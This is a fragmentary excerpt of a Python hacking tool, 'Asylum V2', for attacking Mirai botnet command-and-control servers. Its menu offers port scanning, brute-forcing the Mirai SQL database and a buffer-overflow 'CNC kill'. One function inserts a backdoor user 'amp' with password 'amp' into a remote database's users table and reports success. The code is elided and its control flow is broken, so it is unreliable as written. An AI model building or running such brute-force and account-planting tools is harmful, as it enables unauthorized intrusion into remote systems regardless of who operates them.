...
def help():
    ...
    print("   %s╟ %sNMAP %s- %sAdvanced Portscanner (NMAP must be installed and added to path)            ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sBRUTE %s- %sBrute Mirai SQL Database to gain access (requires PyMySQL)                ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sCNCKILL %s- %sAttempts to kill a Mirai CNC (requires telnetlib)                       ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    print("   %s╟ %sPW %s- %sSecure Password generator                                                    ║%s" % (fg(14),fg(2),fg(1),fg(3),fg(14),attr(0)))
    ...
    print("   %s╟ %sEXIT %s- %sQuit Asylum V2                                                                    ║%s" % (fg(14),fg(1),fg(3),fg(14),attr(0)))
...
def cnckill(ip,port):
    ...
    try:
        ...
        print(f"   %s╠[%s+%s]%s Buffer Overflow Payload Sent!" % (fg(14),fg(3),fg(14),fg(2)))
        return
        ...
        for a_dict in cursor.fetchall():
            for db in a_dict:
                try:
                    ...
                    cursor.execute("INSERT INTO users VALUES (NULL, 'amp', 'amp', 0, 0, 0, 0, -1, 1, 30, '');")
                    print(f"   %s╠[%s+%s]%s Success on {ip} Username: amp Password: amp" % (fg(14),fg(3),fg(14),fg(2)))
                    return
                except:
                    pass
...
def take_commands():
    ...
    if newprompt:
        newprompt = False
        command = input("   %s╔════════════[%s$%s]\n   ╠═══%sAsylum%s@%sterminal%s ~%s" % (fg(14),fg(2),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0))).lower()
    else:
        command = input("   %s╠════════════[%s$%s]\n   ╠═══%sAsylum%s@%sterminal%s ~%s" % (fg(14),fg(2),fg(14),fg(3),fg(14),fg(3),fg(14),attr(0))).lower()
...
print_banner()
if OS == win:
    os.system("title CNC Exploitation")
while True:
    try:
        take_commands()
    except KeyboardInterrupt:
